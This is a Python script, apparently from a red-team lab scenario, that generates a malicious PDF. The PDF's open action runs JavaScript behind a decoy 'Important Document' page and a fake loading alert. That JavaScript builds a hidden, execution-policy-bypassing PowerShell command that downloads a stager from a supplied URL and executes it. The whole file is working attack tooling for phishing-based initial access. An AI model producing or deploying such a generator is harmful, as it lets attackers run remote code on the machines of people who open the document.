#!/usr/bin/env python3
"""
Generate malicious PDF with JavaScript payload for Scenario 1.
Creates a PDF that triggers JavaScript to download and execute PowerShell stager.
"""
import sys

def create_malicious_pdf(output_path, stager_url):
    """
    Create a PDF with embedded JavaScript that downloads and executes PowerShell payload.
    
    Args:
        output_path: Path to save the PDF
        stager_url: URL to PowerShell stager (e.g., http://192.168.58.50:8080/stager.ps1)
    """
    
    # PDF structure with JavaScript embedded
    # This is a minimal PDF that triggers JavaScript on open
    pdf_content = f"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
app.alert("Document is loading...", 3);
try {{
    var url = "{stager_url}";
    var cmd = 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand ' + 
              btoa('$r = Invoke-WebRequest -Uri "' + url + '" -UseBasicParsing; Invoke-Expression $r.Content');
    app.launchURL("cmd://" + cmd, true);
}} catch(e) {{
    app.alert("Error: " + e, 0);
}}
)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj
5 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Important Document) Tj
ET
endstream
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000300 00000 n 
0000000440 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
520
%%EOF"""

    with open(output_path, 'wb') as f:
        f.write(pdf_content.encode('latin-1'))
    
    print(f"[+] Malicious PDF created: {output_path}")
    print(f"[+] Stager URL: {stager_url}")
    print("[!] PDF will execute JavaScript on open to download PowerShell stager")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 04-generate-malicious-pdf.py <output.pdf> <stager_url>")
        print("Example: python3 04-generate-malicious-pdf.py malicious.pdf http://192.168.58.50:8080/stager.ps1")
        sys.exit(1)
    
    output_path = sys.argv[1]
    stager_url = sys.argv[2]
    create_malicious_pdf(output_path, stager_url)
